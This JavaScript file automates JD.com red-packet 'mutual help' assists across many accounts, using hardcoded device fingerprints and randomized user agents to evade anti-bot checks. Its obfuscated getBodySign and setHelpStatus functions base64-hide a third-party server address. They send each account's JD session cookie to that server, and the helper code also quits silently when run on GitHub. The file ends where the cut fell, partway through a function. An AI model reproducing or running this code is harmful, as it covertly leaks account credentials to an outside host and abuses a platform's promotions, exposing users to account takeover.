/*
锦鲤红包互助
入口：[京东App领券频道]
仅内部互助，注意写死LOG怕的请不要用！

============Sami===============
1、由于签名限制,每次互助都要获取签名,如果担心风险,请禁用该脚本。
2、新版本的锦鲤红包增加了同账号助力限制,超过2次后就会报火爆，脚本增加了次数检测限制。
3、为了防止系统火爆,只助力第1账号。
*/

const $ = new Env("Sami锦鲤红包互助")
const JD_API_HOST = 'https://api.m.jd.com/client.action';
const ua = `jdltapp;iPhone;3.1.0;${Math.ceil(Math.random()*4+10)}.${Math.ceil(Math.random()*4)};${randomString(40)}`
let cookiesArr = [], cookie = '';
let shareCodes = [];
!(async () => {
    requireConfig()
    for (let i = 0; i < 1; i++) {
        $.data1 =''
        cookie = cookiesArr[i]
        
        $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
        $.index = i + 1;
        $.nickName = '';
        let data = await requestApi('h5launch', helpNo(i));
        if (data?.data?.result?.status == 1){
           console.log(`账号【${$.index}】火爆1`)
           continue;
           //break;
        }
        console.log(`\n账号【${$.index}】${$.UserName} 只助力第一个账号`);
        data = await requestApi('h5activityIndex', "body=%7B%22isjdapp%22%3A1%7D");
         if (data?.data?.code == 20002) {
             console.log(`账号${$.index},已达拆红包数量限制`)
         }else if (data?.data?.code == 10002) {
             console.log(`账号${$.index},火爆`)
         }else if (data?.data?.code == 20001) {//红包活动正在进行，可拆
             console.log(`互助码: ${data.data.result.redpacketInfo.id}`);
             shareCodes.push(data.data.result.redpacketInfo.id);
         }
    }
    //console.log(cookiesArr)
    await help();
    await $.wait(5000);
})()  .catch((e) => {
    $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
  })
  .finally(() => {
    $.done();
  })


async function help(){
    console.log(`\n******开始助力: 内部互助中，******\n`);
    try {
        for (let i = 0; i < cookiesArr.length; i++) {
        cookie = cookiesArr[i]
        $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
        $.index = i + 1;
        $.nickName = '';
        if (i>=0){
            let data11 = await getBodySign('jinli_h5assist',shareCodes[0],i)
            //console.log(data11)
            if (data11.code === 100){
                let result = await requestApi('jinli_h5assist', data11.data)
                if(result.code === 0 && result.rtn_code === 0){
                   if(result.data.result.status === 0){
                        console.log(`账号【${$.index}】 助力: ${shareCodes[0]}\n您已助力成功!\n`);
                        await setHelpStatus('Setjinli_h5assist');
                        await $.wait(5000);
                   }else if(result.data.result.status === 4){
                        console.log(`账号【${$.index}】 助力: ${shareCodes[0]}\n账号火爆了!\n`);
                        await $.wait(2000);
                   }else if(result.data.result.status === 1){
                        console.log(`账号【${$.index}】 助力: ${shareCodes[0]}\n不能重复为好友助力哦!\n`);
                        await setHelpStatus('Setjinli_h5assist');
                        await $.wait(2000);
                   }else if(result.data.result.status === 8){
                        console.log(`账号【${$.index}】 助力: ${shareCodes[0]}\n抱歉，你不能为自己助力哦!\n`);
                        await $.wait(2000);
                   }
                }else if(result.code === 3){
                    console.log(`账号【${$.index}】 助力: ${shareCodes[0]}\n账号助力太快,被系统检测到了,只能等下次再执行了!\n`);
                    await $.wait(5000);
                }
                //console.log(`账号【${$.index}】 助力: ${shareCodes[0]}\n${$.data1}\n`);
                //{"code":0,"data":{"biz_code":0,"code":0,"result":{"assistReward":{"beginTime":1646184567315,"discount":"0.03","endTime":1646323199315,"hbId":"33146518371","type":10},"followCode":0,"status":0,"statusDesc":"您已助力成功"},"success":true},"rtn_code":0}
                await $.wait(5000);
            }else if(data11.code === 102){
                console.log(`签名网络错误,请稍后重试！`)
                await $.wait(2000);
            }else if(data11.code === 101){
                console.log(`账号【${$.index}】 助力: ${shareCodes[0]}\n已经助力过,跳过本次助力!\n`);
                await $.wait(1000);
            }else if(data11.code === 104){
                console.log(`账号【${$.index}】 助力: ${shareCodes[0]}\n用户信息错误!\n`);
                await $.wait(1000);
            }else{
                console.log(`参数错误！`)
                await $.wait(1000);
            }
        }
    } 
    } catch (e) {
        $.logErr('Error: ', e, resp)
    } finally {
        resolve()
    }
}

function requestApi(functionId, body = {}) {
    return new Promise(resolve => {
        $.post({
            url: `https://api.m.jd.com/api?appid=jinlihongbao&functionId=${functionId}&loginType=2&client=jinlihongbao&t=${gettimestamp()}&clientVersion=10.3.4&osVersion=-1`,
                  //https://api.m.jd.com/api?appid=jinlihongbao&functionId=h5activityIndex&loginType=2&client=jinlihongbao&t=1646029473595&clientVersion=10.3.4&osVersion=-1
            headers: {
                "Cookie": cookie,
                "origin": "https://happy.m.jd.com",
                "referer": "https://happy.m.jd.com/babelDiy/zjyw/3ugedFa7yA6NhxLN5gw2L3PF9sQC/index.html?channel=9",
                'Content-Type': 'application/x-www-form-urlencoded',
                "X-Requested-With": "com.jingdong.app.mall",
                "User-Agent": ua,
            },
            //body: `body=${escape(JSON.stringify(body))}`,
            body: body,
        }, (_, resp, data) => {
            try {
                //console.log(data)
                $.data1=data
                data = JSON.parse(data)
                
            } catch (e) {
                $.logErr('Error: ', e, resp)
            } finally {
                resolve(data)
            }
        })
    })
}



function requireConfig() {
    return new Promise(resolve => {
        notify = $.isNode() ? require('./sendNotify') : '';
        const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
        if ($.isNode()) {
            Object.keys(jdCookieNode).forEach((item) => {
                if (jdCookieNode[item]) {
                    cookiesArr.push(jdCookieNode[item])
                }
            })
            if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
        } else {
            cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
        }
        console.log(`共${cookiesArr.length}个京东账号\n`)
        resolve()
    })
}
function gettimestamp() {
  let time = new Date().getTime();
  return `${time}`;
}




function random(min, max) {
  let num = Math.floor(Math.random() * (max - min)) + min;
  return `"${num}"`;
}


function randomString(e) {
    e = e || 32;
    let t = "abcdefhijkmnprstwxyz2345678",
        a = t.length,
        n = "";
    for (i = 0; i < e; i++)
        n += t.charAt(Math.floor(Math.random() * a));
    return n
}


function Env(t,e){"undefined"!=typeof process&&JSON.stringify(process.env).indexOf("GITHUB")>-1&&process.exit(0);class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}
//getBodySign
var _0x1bb5=['VXNlci1BZ2VudA==','Q29va2ll','Jmk9','JnJlZFBhY2tldElkPQ==','aHR0cDovL2hvc3Q0NTM1MzQudXMub29xci5jb20vbXlTaWduLnBocD9mdW5jdGlvbklkPQ==','cGFyc2U='];var _0x576d=function(_0x1bb5c3,_0x576dc4){_0x1bb5c3=_0x1bb5c3-0x0;var _0x1835e0=_0x1bb5[_0x1bb5c3];if(_0x576d['AEmGPz']===undefined){(function(){var _0x26909f=function(){var _0x564be9;try{_0x564be9=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x272240){_0x564be9=window;}return _0x564be9;};var _0x2e78e6=_0x26909f();var _0x3c2959='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x2e78e6['atob']||(_0x2e78e6['atob']=function(_0x2a89a1){var _0x4679a2=String(_0x2a89a1)['replace'](/=+$/,'');var _0x459b37='';for(var _0x34f143=0x0,_0x16feeb,_0x5dcacc,_0x5f549d=0x0;_0x5dcacc=_0x4679a2['charAt'](_0x5f549d++);~_0x5dcacc&&(_0x16feeb=_0x34f143%0x4?_0x16feeb*0x40+_0x5dcacc:_0x5dcacc,_0x34f143++%0x4)?_0x459b37+=String['fromCharCode'](0xff&_0x16feeb>>(-0x2*_0x34f143&0x6)):0x0){_0x5dcacc=_0x3c2959['indexOf'](_0x5dcacc);}return _0x459b37;});}());_0x576d['XGMauZ']=function(_0x3063a0){var _0x30a989=atob(_0x3063a0);var _0xebc0c=[];for(var _0x23ca5d=0x0,_0x426e06=_0x30a989['length'];_0x23ca5d<_0x426e06;_0x23ca5d++){_0xebc0c+='%'+('00'+_0x30a989['charCodeAt'](_0x23ca5d)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0xebc0c);};_0x576d['kWGOjw']={};_0x576d['AEmGPz']=!![];}var _0x4716a7=_0x576d['kWGOjw'][_0x1bb5c3];if(_0x4716a7===undefined){_0x1835e0=_0x576d['XGMauZ'](_0x1835e0);_0x576d['kWGOjw'][_0x1bb5c3]=_0x1835e0;}else{_0x1835e0=_0x4716a7;}return _0x1835e0;};function getBodySign(_0x3063a0,_0x30a989,_0xebc0c){return new Promise(_0x23ca5d=>{var _0x426e06={};_0x426e06[_0x576d('0x1')]=cookie;_0x426e06[_0x576d('0x0')]=ua;var _0x281068={};_0x281068['url']=_0x576d('0x4')+_0x3063a0+_0x576d('0x3')+_0x30a989+_0x576d('0x2')+_0xebc0c;_0x281068['headers']=_0x426e06;$['get'](_0x281068,(_0x29bb3b,_0x373c9b,_0x304f69)=>{try{$['data1']=_0x304f69;_0x304f69=JSON[_0x576d('0x5')](_0x304f69);}catch(_0x4d1b25){$['logErr']('Error:\x20',_0x4d1b25,_0x373c9b);}finally{_0x23ca5d(_0x304f69);}});});}
//setHelpStatus
var _0x49b5=['Q29va2ll','aHR0cDovL2hvc3Q0NTM1MzQudXMub29xci5jb20vbXlTaWduLnBocD9mdW5jdGlvbklkPQ==','Z2V0','cGFyc2U=','bG9nRXJy','ZGF0YTE='];var _0x3e2d=function(_0x49b513,_0x3e2ddb){_0x49b513=_0x49b513-0x0;var _0x558787=_0x49b5[_0x49b513];if(_0x3e2d['aCOdpq']===undefined){(function(){var _0x8df209=function(){var _0x1c2be8;try{_0x1c2be8=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x4650dd){_0x1c2be8=window;}return _0x1c2be8;};var _0x432ff3=_0x8df209();var _0x4ffec1='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x432ff3['atob']||(_0x432ff3['atob']=function(_0x2b43cd){var _0x1514de=String(_0x2b43cd)['replace'](/=+$/,'');var _0x7303ff='';for(var _0x10bec1=0x0,_0x3b90dc,_0xfe7627,_0x340111=0x0;_0xfe7627=_0x1514de['charAt'](_0x340111++);~_0xfe7627&&(_0x3b90dc=_0x10bec1%0x4?_0x3b90dc*0x40+_0xfe7627:_0xfe7627,_0x10bec1++%0x4)?_0x7303ff+=String['fromCharCode'](0xff&_0x3b90dc>>(-0x2*_0x10bec1&0x6)):0x0){_0xfe7627=_0x4ffec1['indexOf'](_0xfe7627);}return _0x7303ff;});}());_0x3e2d['RLgyMl']=function(_0x3f1458){var _0x3ee94e=atob(_0x3f1458);var _0x3b9fbd=[];for(var _0x1f326e=0x0,_0x7b42e8=_0x3ee94e['length'];_0x1f326e<_0x7b42e8;_0x1f326e++){_0x3b9fbd+='%'+('00'+_0x3ee94e['charCodeAt'](_0x1f326e)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x3b9fbd);};_0x3e2d['yfRKBr']={};_0x3e2d['aCOdpq']=!![];}var _0x5dbbfc=_0x3e2d['yfRKBr'][_0x49b513];if(_0x5dbbfc===undefined){_0x558787=_0x3e2d['RLgyMl'](_0x558787);_0x3e2d['yfRKBr'][_0x49b513]=_0x558787;}else{_0x558787=_0x5dbbfc;}return _0x558787;};function setHelpStatus(_0xfe7627){return new Promise(_0x340111=>{var _0x3f1458={};_0x3f1458[_0x3e2d('0x0')]=cookie;_0x3f1458['User-Agent']=ua;var _0x3ee94e={};_0x3ee94e['url']=_0x3e2d('0x1')+_0xfe7627;_0x3ee94e['headers']=_0x3f1458;$[_0x3e2d('0x2')](_0x3ee94e,(_0x3b9fbd,_0x1f326e,_0x7b42e8)=>{try{$[_0x3e2d('0x5')]=_0x7b42e8;_0x7b42e8=JSON[_0x3e2d('0x3')](_0x7b42e8);}catch(_0x42545c){$[_0x3e2d('0x4')]('Error:\x20',_0x42545c,_0x1f326e);}finally{_0x340111(_0x7b42e8);}});});}

var _0x1ca1=['body=%7B%22followShop%22%3A0%2C%22random%22%3A%2266335111%22%2C%22log%22%3A%221645956626363~11HuwulR4YlMDFOam95UzAyMQ%3D%3D.f1xbTGp7XFlIZXdbWQdmKxJZLwcpBDYJLX9GWVVkYlsRSy1%2FFAoRHCNHLQBjGlg8NAAFJF82CyUlOwkkMA%3D%3D.669322a5~7%2C1~0EB515350D83EE07863282B18DCFD0C3DB27B941~1a5fm4i~C~SRJFXREOam0eGkdbXhQJbxJXBR4EBB52cB4HcmgfVR1EEBQRUQQbBQMcdnIfBXZlH1MeRBMcEVAAHQQPH3BxGgRzfh9FH0YRbx8QVUJfEgkFHRJBSxEPEQcFAAUKBQUEAgQEAQQCCQIBFh0SRV1XFwkUR0BER0RVR1UQHxBFVVASCRZXVkZMR0FGVxEYEkNUXRAJaQceBQAGHAoYAAAeCR8AbhoRXloRCgIeEVFAEAgSBgNXUAlSAFpQBVACUAJWAFMLBVALUAoKB1UAC1FVUQoaHxddRhEOElpgW11dVxEeEEQTCgICBQULDQUDAQAAAgMfEllZEQgRUAFRCFRWBFVRVwhRBlZVC1IAUQMKUAFRAgFRBQQHAAwBVQZbVQxRAxEYElVAURAJEFZafV0cckoEZQJhdWB%2BfQZ8bFt8ZENFER4RXEQSCxJyREFcVxhwWl5GRkBVQRwTe11RHRAeEl9RRRYLEgMOBAwBBBEYEkBTQRAJaQQBBBwFAQdpHRJAVxEPaBRaZFhcXlYDAx4BEB4SWH9gFh0SAwsdAxEaEQUAHQMdABEeEQMEBwgCARYdElALUgxXUwNQUVYAUQFWUQtUAlICCVEGUgEBWwYABAULBFUHU1ULUQcRHhBRE20fFlhfUxoJF1VQVVJWVURHEB8QUlgQChNFERgTU1saCRdEBR0GHgcSHxBQVGxEEAoTAAEWHRJQXBEPEURSWlRcXQ4EBQEABwMBABIfFlxaEAJoBB8GHwRtHxJRXlxVEQgQAQcEBg0EBgQJBQACA00FckIHZGZLRlJHc311dnVmaXJLamd0S3hyCQ0dVHt8dmAASkVTAWpwV19UCmpyQnFwRABjdHEHAHd3Zlt9Sn9AcFgERlNgYnphckcEf0t1anNgXXl1ZmIIeEkMXmFFVEJWYHtkd0hqAH1aXGJ6cUVaYUhidnxKCmx7ZHFHdHBXA3J7Ald4VGNBfGBXRH1icUF%2BZ2cAf0pXcnFjVEVwd3Zrflp8A3hwRnp7QnpPekx6ZmBmfV9WcHN0cHd6AnF3bQB9AVAHekQLDhoIBQULUQNUUUxFHABOTUpzTmZ6aWRkBmlRdXVhe3ViZ2B6SmZndnIAZmhwYVFzZVpwcmEHYnZ3W3VhWmd%2Fd2F2cnBXe210XWluZgZEcXZiBmJwRGdgeFppZHFwAGV%2BYUZgYVhhZXdyand0Y2J6cEdgYXRMa2N3fgZydnNcCU4CUUsDRANKEB4SXENUFgsSEEU%3D~0u0lnvh%22%2C%22sceneid%22%3A%22JLHBhPageh5%22%7D'];var _0x5b4a=function(_0x1ca154,_0x5b4a2c){_0x1ca154=_0x1ca154-0x0;var _0x552086=_0x1ca1[_0x1ca154];return _0x552086;};function helpNo(_0x10f4c4){if(_0x10f4c4<=0xa){return'body=%7B%22followShop%22%3A0%2C%22random%22%3A%2212018911%22%2C%22log%22%3A%221646029475192~1KnwC8o7cYwMDFMaUpnZTAyMQ%3D%3D.fV9%2BUVV%2BUH5RUn9YfxkkAgwIChU7KBpQG31FfEtSYFg0VRt9FyYUA38ZDh0wAVoeUy4UIDwANQ9eBwwkMg%3D%3D.eceb569b~7%2C1~F159CAFDD5FDBF4F4AA17F3B7BB57EDFA69BA249~1i5wyag~C~SBNFXRAKaBRWBh4FYR9%2BdxoAZ2YfUB9EER0TVAQdBmceegUcAGYDHlcdRxMfE1cGHgRjHHgCHwdnZB9RHUcWbxoTR19eEwlrEVUEHQBmHw51HAZpZR9VHkITHxNXBh4CZR0Jdx4GA2EeUR9EEx8WVgccAWcfCXQcBQBlHEccVRRvHBFXQ10WCAcdEUJAEwkSAgcFBgICCgIEBwMCBAYCAAYTHxNEVFcSCRNFREZER1BHVhEcE0RRUxQLEVdVRUdER0RQEh4SQ1JcEglrBR8CCgIdCh0CAR8BHwRsHBBaWRQIAR8SUkAWCBQFB1RSVQMBBVUBVVcBBVdUU1ZRCFVSUA4AAVUBVwAAVxMdElxAEQwQWWNYXl1REBoTRxMJAAUEBQEDCQYHBgcLAh8SW1gWCBRXUVcHAwcGAwIHUgUCBQdRVgVVBVEHAlBQBQIHAgdWCgACAlRVBlBXEh8SV0NWEAwTX0JVAkN0SWR8A2YEeG57RlRgcgR5WXcTHxNdRxEKEXBBQF5VE3VdXUNFRVZGHhZ4XVIdEx8SXVBHEggSAgAFCQcFEx8WQVVDEQtoCQICHwIGBW8cEURdEglrE1pkWllfVgAAHQISHxNYf2ESHxQDBR0AHwEWHhQAAx8AHwcSHxMABgUJBwMQHBFWU1UAAAIHAwIFUwQCBQBSVgRVB1QBAFVRBwAAAQJXCgAAA1VVBldUEh4SUhRvHBFZXlIWCBRXVVdVV1VERxMdElNaEQwQRREcE1BdEAwTRAIdAx0EER0TU1RvRRQIEgMCEx8WUFITCRNBUF1UXFwMAQAAAg4LAQISHRFZWBQLaAMfAh8Dbh0TUl5fVBQIEgIGBQUEAA8FBgcHAgFOAlpyRmJ%2BSmNoR319dXVZUwVnalJ3cEt%2BcgwMHmQBAnRQW3FlZFhyRmRndWthWGpzdWJeVGJzX259dWZCdVt2enICYVBgXVx8UVYEaHRhS0N1WXpTeWJxBXpdB1xqY3p9ZElaRWpkelx3SQtTe2VbHXBLX2B8dAIBe1ZCV2B0XGJidAd1flllc3JbWGVxSwtAfnMJXXdjdl56ZFhFelpxWmZwQ1VkckRTf3UJcXRbckF9SUtDYHFhen9lfkF9WwtEelpzZ3p0fh1iRwMHeFpTYXRGdmR2clx%2FcHAIRX10YlVwWnJpYktDVHpzA0hkSVhhYnB0an1ZW3J%2FSGYNHwcCA1QCBQEGT0kcAk9PTnBOZ118ZWtyaHpydGN0YEZpcHRbdWdjRwZha15damF2QXJyVQJpYklAaWJycnx3cXRicQdzZWdIYHRhXwdzdFYKdHFHdmZ2clFkdWcKZ3ZyXmZsWlVmZHNhZXRcZnRwV1FRdGNgZ3ZXBWRySkEMTQFJCAJaAEYTHBBdQFEQChESTA%3D%3D~1j6z9l5%22%2C%22sceneid%22%3A%22JLHBhPageh5%22%7D';}if(_0x10f4c4<=0x14&&_0x10f4c4>0xa){return'body=%7B%22followShop%22%3A0%2C%22random%22%3A%2217826611%22%2C%22log%22%3A%221645956276992~1lg4WcZRHZ4MDFWa0FPZjAyMQ%3D%3D.Z111el9jXXN5XmRYeDEKDiknFx5lPTMgGGdHd2NRelo%2FfRhnFSQnKTtGAzZWAlkSAjUdJXEAPj0kFT8RKA%3D%3D.9078e19b~7%2C1~0034B33DDBD019F5BFCCCCA53AB289D3E40B05BC~0abzu6z~C~SBJFXxILa2wUEEVfWxEKaRVWAR4HfRV2CB8GZHscUBxFGh4TVQEeB3wbdwwfBmVvH1EfRBMeElUBHA99HXQPHwZrDh5BH0QRZB8SVEJfEAoAHBNLQRMLFAIGBgILAQUCBQEDAAYICAUIExwTT1dVEwwRREZDRkBVRVUbHxJEVVAQChNWV0xGRUVDUhIeFUJQXRIJYgccBAAGHgkdAQEUAx0Eax8SWF0QDgIcEVpAEgkSBgFUVQhTClBSAVUHUwRRAVcLB1AAUAgLB1UCCFRUUAAQHRNYQxIIFVtkW19dXBEcEUQTCAEHBAQBBwcDAQUJCwUeFllbEQMRUgBRCFZVAVRQXQJTAlNQCFQHUAcKUgFaAgNQBQQFAwkAVAxRVwhUBhIeFVREURIJG1ZYfF0ccEkBZANrf2J6eAN%2Falx9YENHERURXkUSCxBxQUBdXRJyXltDRUZSQBgTeV1aHRIfEl9TRhMKEwkEBggEARIeFUFXQRIJYgQDBRwFAwRsHBNKXRMLbRFZYl9dWlYBAxUBEh8SWH1jExwTCQEfBxQfEgMHHAcdAhEVEQEFBwgAAhMcE1oBUAhSVgBWVlcEUQNWWgtWA1ICC1IDUwALUQQEAQAIAlIGV1UJUQwRHBFRE28cE1leWRALE1BVVlRRVEBHEh8bUloRChNHEh0SUlEQCxNBAB4AGQYWHxJQX2xGEQoTAgITHBNaVhMLFEFRXFNdWQ4BBAEBBgUBABAcE11bGghqABoDHAJqHhZRXFxeEQoRAQcGBQgFBwoEBggOBU4DbwUGRXp6fmZ%2FQ311dHdSZQB7ZHVwTn1xDwocUANUBl0BAUliAgsDaAMEcVRLRld6WF0HUV1hG3x6fgN4WnNWfgMFGllZcEtScEABc0tDXHVwUgp6cmJCenFCZlJAWkFjZAdddV9ndXBJXFx6SFRVdUVlcnJGcVh1cHhWemNQXnYDW1R%2FW2VFd2VncXxzfGF5cGNbenJ%2FD3xgWEpjcURfY0pwdnZgR2hxc2h%2Bc0p9YXRqAGVqYHRKf2t6XHNHeHlwCl4GdUEODRxVVA0HAVYBUE5KHABMTk9yT2tae2BuS3V5cmRXf3hEaGd4cWJgd1dCUWZQe1d0cEtxd2ZFZnZYC25ncn59dEVTYXNGYWZ3c3BnZmUGenFUW2Z4RHVhd3NCdHdxQmt0cwllZHVdZXFcdnN7aHJ0cVd8YXhJamt9RUZlc1hDD0kDXlgGSQpcEh8SXEFXEwoTGk8%3D~18l5kyt%22%2C%22sceneid%22%3A%22JLHBhPageh5%22%7D';}if(_0x10f4c4<=0x1e&&_0x10f4c4>0x